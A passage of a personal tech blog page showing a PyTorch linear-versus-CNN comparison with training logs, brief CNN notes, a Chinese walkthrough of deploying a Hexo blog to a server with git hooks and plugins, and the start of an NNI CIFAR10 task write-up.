batch_y <span class="keyword">in</span> train_loader:</span><br><span class="line">            <span class="comment"># forward</span></span><br><span class="line">            batch_z = model(batch_x)</span><br><span class="line">            <span class="comment"># backward</span></span><br><span class="line">            loss = loss_func(batch_z, batch_y)</span><br><span class="line">            loss.backward()</span><br><span class="line">            optimizer.step()</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">        model.<span class="built_in">eval</span>()</span><br><span class="line">        <span class="comment"># inference: using validation set</span></span><br><span class="line">        <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">            valid_loss = <span class="built_in">sum</span>(loss_func(model(batch_x), batch_y) <span class="keyword">for</span> batch_x, batch_y <span class="keyword">in</span> valid_loader) / num_valid</span><br><span class="line">        print(<span class="string">&quot;epoch %d, validation loss=%.4f&quot;</span> % (epoch, valid_loss))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;training done.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;testing...&#x27;</span>)</span><br><span class="line">    ZTest = model(XTest)</span><br><span class="line">    print(<span class="string">&#x27;loss=%.4f, accuracy=%.4f&#x27;</span> % (loss_func(ZTest, YTest), accuracy(ZTest, YTest)))</span><br><span class="line">    print(<span class="string">&#x27;testing done.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">train()</span><br><span class="line">test()</span><br></pre></td></tr></table></figure></p>
<h2 id="Result-Comparision"><a href="#Result-Comparision" class="headerlink" title="Result Comparision"></a>Result Comparision</h2><h3 id="Linear"><a href="#Linear" class="headerlink" title="Linear"></a>Linear</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">training...</span><br><span class="line">epoch 0, validation loss&#x3D;0.0032</span><br><span class="line">epoch 1, validation loss&#x3D;0.0028</span><br><span class="line">epoch 2, validation loss&#x3D;0.0026</span><br><span class="line">epoch 3, validation loss&#x3D;0.0025</span><br><span class="line">epoch 4, validation loss&#x3D;0.0024</span><br><span class="line">epoch 5, validation loss&#x3D;0.0024</span><br><span class="line">epoch 6, validation loss&#x3D;0.0023</span><br><span class="line">epoch 7, validation loss&#x3D;0.0023</span><br><span class="line">epoch 8, validation loss&#x3D;0.0023</span><br><span class="line">epoch 9, validation loss&#x3D;0.0022</span><br><span class="line">epoch 10, validation loss&#x3D;0.0022</span><br><span class="line">epoch 11, validation loss&#x3D;0.0022</span><br><span class="line">epoch 12, validation loss&#x3D;0.0022</span><br><span class="line">epoch 13, validation loss&#x3D;0.0022</span><br><span class="line">epoch 14, validation loss&#x3D;0.0022</span><br><span class="line">epoch 15, validation loss&#x3D;0.0022</span><br><span class="line">epoch 16, validation loss&#x3D;0.0022</span><br><span class="line">epoch 17, validation loss&#x3D;0.0021</span><br><span class="line">epoch 18, validation loss&#x3D;0.0022</span><br><span class="line">epoch 19, validation loss&#x3D;0.0021</span><br><span class="line">training done.</span><br><span class="line">testing...</span><br><span class="line">loss&#x3D;0.2707, accuracy&#x3D;0.9251</span><br><span class="line">testing done.</span><br></pre></td></tr></table></figure>
<h3 id="CNN"><a href="#CNN" class="headerlink" title="CNN"></a>CNN</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">training...</span><br><span class="line">epoch 0, validation loss&#x3D;0.0042</span><br><span class="line">epoch 1, validation loss&#x3D;0.0020</span><br><span class="line">epoch 2, validation loss&#x3D;0.0018</span><br><span class="line">epoch 3, validation loss&#x3D;0.0017</span><br><span class="line">epoch 4, validation loss&#x3D;0.0015</span><br><span class="line">epoch 5, validation loss&#x3D;0.0012</span><br><span class="line">epoch 6, validation loss&#x3D;0.0015</span><br><span class="line">epoch 7, validation loss&#x3D;0.0013</span><br><span class="line">epoch 8, validation loss&#x3D;0.0012</span><br><span class="line">epoch 9, validation loss&#x3D;0.0011</span><br><span class="line">epoch 10, validation loss&#x3D;0.0011</span><br><span class="line">epoch 11, validation loss&#x3D;0.0012</span><br><span class="line">epoch 12, validation loss&#x3D;0.0011</span><br><span class="line">epoch 13, validation loss&#x3D;0.0013</span><br><span class="line">epoch 14, validation loss&#x3D;0.0010</span><br><span class="line">epoch 15, validation loss&#x3D;0.0010</span><br><span class="line">epoch 16, validation loss&#x3D;0.0010</span><br><span class="line">epoch 17, validation loss&#x3D;0.0010</span><br><span class="line">epoch 18, validation loss&#x3D;0.0010</span><br><span class="line">epoch 19, validation loss&#x3D;0.0009</span><br><span class="line">training done.</span><br><span class="line">testing...</span><br><span class="line">loss&#x3D;0.1135, accuracy&#x3D;0.9666</span><br><span class="line">testing done.</span><br></pre></td></tr></table></figure>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Life is short, I use PyTorch.</p>
<p>CNN, yyds!</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/10/Convolution-Neural-Network-Learning-Notes/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/10/Convolution-Neural-Network-Learning-Notes/" class="post-title-link" itemprop="url">Convolution Neural Network Learning Notes</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-10 16:02:21" itemprop="dateCreated datePublished" datetime="2021-01-10T16:02:21+08:00">2021-01-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-01-11 19:34:57" itemprop="dateModified" datetime="2021-01-11T19:34:57+08:00">2021-01-11</time>
              </span>

          
            <span id="/2021/01/10/Convolution-Neural-Network-Learning-Notes/" class="post-meta-item leancloud_visitors" data-flag-title="Convolution Neural Network Learning Notes" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/01/10/Convolution-Neural-Network-Learning-Notes/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/10/Convolution-Neural-Network-Learning-Notes/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>when describing a “weights-bias”, we use four dimensions:</p>
<ol>
<li>the number of filters(euqal to the number of features to output)</li>
<li>the number of kernals(equal to the number of input channels; RGB: 3, gray: 1)</li>
<li>the first dimension of the kernal</li>
<li>the second dimension of the kernal</li>
</ol>
<p>a “weights-bias” consist of multiple filters plus a bias.</p>
<p>While using PyTorch, you can leave the first dimension -1, which means undecided, so that this number can be calculated with the help of the rest known dimension.</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/08/My-Hexo-Blog-Configuration/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/08/My-Hexo-Blog-Configuration/" class="post-title-link" itemprop="url">My Hexo Blog Configuration</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-01-08 22:04:28 / Modified: 23:44:23" itemprop="dateCreated datePublished" datetime="2021-01-08T22:04:28+08:00">2021-01-08</time>
            </span>

          
            <span id="/2021/01/08/My-Hexo-Blog-Configuration/" class="post-meta-item leancloud_visitors" data-flag-title="My Hexo Blog Configuration" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/01/08/My-Hexo-Blog-Configuration/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/08/My-Hexo-Blog-Configuration/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>芜湖！起飞！今天备案终于审核通过了！捣鼓了一下，终于把博客弄得像模像样的，就顺带记录一下！</p>
<h2 id="序幕"><a href="#序幕" class="headerlink" title="序幕"></a>序幕</h2><p>军训汇操在早上结束了，回到宿舍一打开手机就连收到三条信息，终于给爷备案好了！</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/My-Hexo-Blog-Configuration/WeChat_Image_20210108221637.jpg">
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/My-Hexo-Blog-Configuration/WeChat_Image_20210108221657.jpg">
<p>我啪的一下就开始准备我的博客了，很快啊！</p>
<h2 id="博客框架"><a href="#博客框架" class="headerlink" title="博客框架"></a>博客框架</h2><p>博客使用Hexo搭建，用了NexT主题(NexT.Gemini)，在GitHub上就能找到这个主题。</p>
<p>Hexo只要有npm就可以安装了，跑条命令安装一下就行。</p>
<p>Hexo的操作可以直接看官方文档，也很容易懂，这里不赘述。</p>
<p>GitHub Pages之前就配置好了，现在主要是需要配置到我的服务器上面去。</p>
<h2 id="Hexo同步至服务器"><a href="#Hexo同步至服务器" class="headerlink" title="Hexo同步至服务器"></a>Hexo同步至服务器</h2><p>首先，在服务器上面安装一下git和nginx。在备案没有成功的时候，可以直接用买服务器时给的弹性公网IP直接去上，效果是一样的。</p>
<p>按照我的印象，当没有安装nginx时，在浏览器中输入ip打开，是会出现小恐龙的，而安装了nginx之后就成了404。这说明nginx确实已经开始起作用了，安装正常。</p>
<p>然后可以在服务器那端用ssh免密登录，粗略流程是这样的：</p>
<ol>
<li>在本机用<code>ssh-keygen</code>创建一个ssh公钥和私钥。</li>
<li>在服务器的<code>.ssh</code>目录创建一个<code>authorized_keys</code>，再<code>chmod</code>一下。</li>
<li>把ssh公钥写到<code>authorized_keys</code>上面去。</li>
</ol>
<p>这个时候，只要本机有私钥，服务器有公钥，我们就可以通过一个ssh命令免密远程登录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh root@&quot;your_ip&quot;</span><br></pre></td></tr></table></figure>
<p>之后创建<code>/var/repo</code>文件夹，在里面新建一个叫blog的git仓库，新建命令如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git init --bare blog.git</span><br></pre></td></tr></table></figure>
<p>之后，打开<code>blog.git/hooks/post-receive</code>，<code>chmod</code>一下，同时添加下列内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">git --work-tree&#x3D;&#x2F;var&#x2F;www&#x2F;hexo --git-dir&#x3D;&#x2F;var&#x2F;repo&#x2F;blog.git checkout -f</span><br></pre></td></tr></table></figure>
<p>之后，在<code>var/www/hexo</code>处创建好文件夹，<code>chmod</code>一下，这样之后，服务器端的设置就完成了。</p>
<p>最终我们想要的是：在本机输入<code>hexo d</code>时，能部署到服务器上，这时需要在根目录下的<code>_config.yml</code>下修改：</p>
<h3 id="第一处"><a href="#第一处" class="headerlink" title="第一处"></a>第一处</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># URL</span><br><span class="line">## If your site is put in a subdirectory, set url as &#39;http:&#x2F;&#x2F;example.com&#x2F;child&#39; and root as &#39;&#x2F;child&#x2F;&#39;</span><br><span class="line">url: https:&#x2F;&#x2F;your_ip</span><br></pre></td></tr></table></figure>
<h3 id="第二处"><a href="#第二处" class="headerlink" title="第二处"></a>第二处</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  - type: git</span><br><span class="line">    repo: git@github.com:Garen-Wang&#x2F;garen-wang.github.io.git</span><br><span class="line">    branch: master</span><br><span class="line">  - type: git</span><br><span class="line">    repo: root@your_ip:&#x2F;var&#x2F;repo&#x2F;blog.git</span><br><span class="line">    branch: master</span><br></pre></td></tr></table></figure>
<p>这样就应该能把hexo部署到你的服务器上面去了。</p>
<h2 id="添加备案号"><a href="#添加备案号" class="headerlink" title="添加备案号"></a>添加备案号</h2><p>网站还是得加备案号的，不过这里不用改模板，直接在NexT主题的<code>_config.yml</code>中修改：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">footer:</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  # Beian ICP and gongan information for Chinese users. See: http:&#x2F;&#x2F;www.beian.miit.gov.cn, http:&#x2F;&#x2F;www.beian.gov.cn</span><br><span class="line">  beian:</span><br><span class="line">    enable: true</span><br><span class="line">    icp: 粤ICP备2021003110号</span><br><span class="line">    # The digit in the num of gongan beian.</span><br><span class="line">    gongan_id:</span><br><span class="line">    # The full num of gongan beian.</span><br><span class="line">    gongan_num: 2021003110</span><br><span class="line">    # The icon for gongan beian. See: http:&#x2F;&#x2F;www.beian.gov.cn&#x2F;portal&#x2F;download</span><br><span class="line">    gongan_icon_url: images&#x2F;beian.png</span><br></pre></td></tr></table></figure>
<p>在主题文件夹中的<code>source</code>中新建个<code>images</code>文件夹，可以把<a target="_blank" rel="noopener" href="http://www.beian.gov.cn/portal/download">这张图片</a>下载到里面去，就可以用相对路径引用了。btw，对头像的设置也是同理。</p>
<h2 id="mathjax支持"><a href="#mathjax支持" class="headerlink" title="mathjax支持"></a>mathjax支持</h2><p>这个东西曾经困扰了我很久，其实只要按下面的顺序，NexT主题也能用上mathjax。</p>
<p>先更换Hexo的Markdown渲染引擎：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure>
<p>需要在<code>node_modules/kramed/lib/rules/inline.js</code>中修改两处（分别是原第11行和第20行）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;escape: &#x2F;^\\([\\&#96;*&#123;&#125;\[\]()#$+\-.!_&gt;])&#x2F;,</span><br><span class="line">escape: &#x2F;^\\([&#96;*\[\]()#$+\-.!_&gt;])&#x2F;,</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;em: &#x2F;^\b_((?:__|[\s\S])+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)&#x2F;,</span><br><span class="line">em: &#x2F;^\*((?:\*\*|[\s\S])+?)\*(?!\*)&#x2F;,</span><br></pre></td></tr></table></figure>
<p>最后在每个需要启用mathjax的博客页面里，在一开始的Front-matter那里加上一句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mathjax: true</span><br></pre></td></tr></table></figure>
<p>这样就可以用上LaTeX语法写行内公式和行间公式了。</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/My-Hexo-Blog-Configuration/2021-01-08_23-29.png">
<h2 id="搜索框"><a href="#搜索框" class="headerlink" title="搜索框"></a>搜索框</h2><p>搜索框也很容易实现。</p>
<p>先用npm安装下插件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ npm install --save hexo-generator-search</span><br><span class="line">$ npm install --save hexo-generator-searchdb</span><br></pre></td></tr></table></figure>
<p>在NexT主题文件夹下的<code>_config.yml</code>下修改：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure>
<p>重新部署一下之后，就可以看到出现了搜索框。</p>
<h2 id="评论系统支持"><a href="#评论系统支持" class="headerlink" title="评论系统支持"></a>评论系统支持</h2><p>评论系统中，NexT主题的配置中自带对Valine的支持，我们干脆直接用它咯！</p>
<h3 id="Valine的使用"><a href="#Valine的使用" class="headerlink" title="Valine的使用"></a>Valine的使用</h3><ol>
<li>在LeanCloud注册</li>
<li>创建应用，名称随意</li>
<li>进入“设置-应用Keys”，获取App ID和AppKey</li>
<li>在主题文件夹中的<code>_config.yml</code>修改Valine对应内容为：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">valine:</span><br><span class="line">  enable: true</span><br><span class="line">  appid: Your leancloud application appid</span><br><span class="line">  appkey: Your leancloud application appkey</span><br><span class="line">  notify: true # Mail notifier</span><br><span class="line">  verify: false # Verification code</span><br><span class="line">  placeholder: Just go go # Comment box placeholder</span><br><span class="line">  avatar: mm # Gravatar style</span><br><span class="line">  guest_info: nick,mail,link # Custom comment header</span><br><span class="line">  pageSize: 10 # Pagination size</span><br><span class="line">  language: zh-cn # Language, available values: en, zh-cn</span><br><span class="line">  visitor: true # Article reading statistic</span><br><span class="line">  comment_count: true # If false, comment count will only be displayed in post page, not in home page</span><br><span class="line">  recordIP: false # Whether to record the commenter IP</span><br><span class="line">  serverURLs: # When the custom domain name is enabled, fill it in here (it will be detected automatically by default, no need to fill in)</span><br><span class="line">  #post_meta_order: 0</span><br></pre></td></tr></table></figure>
<p>然后在储存-结构化数据中创建两个新的Class，名称分别为<code>Comment</code>和<code>Counter</code>，分别可以用来存评论和链接访问数，非常方便。</p>
<p>在LeanCloud后台看到的数据就是这样的：</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/My-Hexo-Blog-Configuration/2021-01-08_22-44.png">
<p>之后部署一下就可以看到效果了！</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/My-Hexo-Blog-Configuration/2021-01-08_22-42.png">
<h2 id="七牛云图床"><a href="#七牛云图床" class="headerlink" title="七牛云图床"></a>七牛云图床</h2><p>首先先在博客根目录安装一下需要的Hexo插件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install --save hexo-qiniu-sync</span><br></pre></td></tr></table></figure><br>在七牛云右上角的密钥管理就可以找到access key和secret key了，bucket填你自己创建时写的空间名称，在<code>_config.yml</code>里面添加这一段配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">qiniu:</span><br><span class="line">  offline: false</span><br><span class="line">  sync: true</span><br><span class="line">  bucket: &quot;your_bucket_name&quot;</span><br><span class="line">  access_key: &quot;your_access_key&quot;</span><br><span class="line">  secret_key: &quot;your_secret_key&quot;</span><br><span class="line">  dirPrefix: static</span><br><span class="line">  urlPrefix: http:&#x2F;&#x2F;&quot;your_qiniu_url&quot;&#x2F;static</span><br><span class="line">  up_host: http:&#x2F;&#x2F;upload.qiniu.com</span><br><span class="line">  local_dir: static</span><br><span class="line">  update_exist: true</span><br><span class="line">  image: </span><br><span class="line">    folder: images</span><br><span class="line">    extend: </span><br><span class="line">  js:</span><br><span class="line">    folder: js</span><br><span class="line">  css:</span><br><span class="line">    folder: css</span><br></pre></td></tr></table></figure>
<p>在文档中，就不需要使用Markdown的插入图片格式了，使用下面的格式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% qnimg test.jpg %&#125;</span><br></pre></td></tr></table></figure>
<p>这样的语句会自动读取<code>static/images/test.jpg</code>这个路径下的图片。</p>
<p>在更新博客时，可以先跑一下这条命令，将<code>static/images</code>下的所有图片都上传到七牛云，这样博客的外链就能访问出图片了。</p>
<p>不过不跑似乎也没关系，在<code>hexo g</code>的时候似乎会自动帮你上传，挺贴心的。</p>
<h2 id="小彩蛋"><a href="#小彩蛋" class="headerlink" title="小彩蛋"></a>小彩蛋</h2><h3 id="我大E了啊"><a href="#我大E了啊" class="headerlink" title="我大E了啊"></a>我大E了啊</h3><p>在配置的时候有一次跑<code>hexo g -d</code>的时候报错了，怎么改都改不好，心态差点崩了，差点要把整个博客重新弄一遍。</p>
<p>这种情况的最好解决方法是一开始就用git维护整个仓库。最后我直接用<code>git reset</code>回滚到上次commit的时候，一切就又都回来了。我又继续无止境地配置下去了……</p>
<h3 id="什么？DDL？"><a href="#什么？DDL？" class="headerlink" title="什么？DDL？"></a>什么？DDL？</h3><p>啊？什么？我今天没赶DDL？</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/My-Hexo-Blog-Configuration/WeChat_Image_20210108221702.jpg">
<p>其实明天是数创大作业的deadline。。。</p>
<p>放心，明天弄得完的。deadline是第一生产力。。。</p>
<p>熬夜继续爆肝大作业，还不如早点休息。。。</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/My-Hexo-Blog-Configuration/84869490_p0.jpg">
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/as480133937/article/details/100138838">https://blog.csdn.net/as480133937/article/details/100138838</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yexiaohhjk/article/details/82526604">https://blog.csdn.net/yexiaohhjk/article/details/82526604</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/34747279">https://zhuanlan.zhihu.com/p/34747279</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/70bf58c48010">https://www.jianshu.com/p/70bf58c48010</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/08/NNI-Student-Program-2020-Task2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/08/NNI-Student-Program-2020-Task2/" class="post-title-link" itemprop="url">NNI Student Program 2020-Task2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-01-08 19:51:37 / Modified: 21:52:13" itemprop="dateCreated datePublished" datetime="2021-01-08T19:51:37+08:00">2021-01-08</time>
            </span>

          
            <span id="/2021/01/08/NNI-Student-Program-2020-Task2/" class="post-meta-item leancloud_visitors" data-flag-title="NNI Student Program 2020-Task2" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/01/08/NNI-Student-Program-2020-Task2/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/08/NNI-Student-Program-2020-Task2/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Task2-进阶任务-HPO-NAS"><a href="#Task2-进阶任务-HPO-NAS" class="headerlink" title="Task2 进阶任务 HPO+NAS"></a>Task2 进阶任务 HPO+NAS</h1><h2 id="Task-2-1"><a href="#Task-2-1" class="headerlink" title="Task 2.1"></a>Task 2.1</h2><h3 id="CIFAR10简介"><a href="#CIFAR10简介" class="headerlink" title="CIFAR10简介"></a>CIFAR10简介</h3><p>CIFAR10数据集共有60000张分辨率为32*32的彩色图像，分为十类，每类都有6000张图像。</p>
<p>50000张图像构成训练集，10000张图像构成测试集。</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/NNI-Student-Program-2020-Task2/1.png">

<h3 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h3><p>我们使用PyTorch编写卷积神经网络来解决这项图像分类任务。</p>
<p>大体流程如下：</p>
<ol>
<li>使用torchvision下载数据集，读取数据集</li>
<li>定义解决该问题的卷积神经网络</li>
<li>训练神经网络</li>
<li>测试神经网络</li>
</ol>
<p>代码中的神经网络有两个卷积层：</p>
<ol>
<li>第一层，3个输入（RGB），6个输出。</li>
<li>第二层，6个输入，16个输出。</li>
</ol>
<p>池化层通过<code>torch.nn.MaxPool2d</code>来创建。</p>
<p>然后定义三个全连接函数：</p>
<ol>
<li>第一个，将16*5*5个节点连接至120个节点。</li>
<li>第二个，将120个节点连接到84个节点。</li>
<li>第三个，将84个节点连接到10个节点，即对应分类。</li>
</ol>
<p>激活函数全程使用Relu函数。</p>
<p>误差函数使用交叉熵函数，优化方法使用SGD。</p>
<h3 id="实验配置"><a href="#实验配置" class="headerlink" title="实验配置"></a>实验配置</h3><p>使用Anaconda环境下的Python3.8，使用PyCharm运行程序。</p>
<p>设置程序不使用GPU，只用CPU完成训练。</p>
<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>我们利用了<code>torch.nn</code>模块定义了本任务的神经网络。</p>
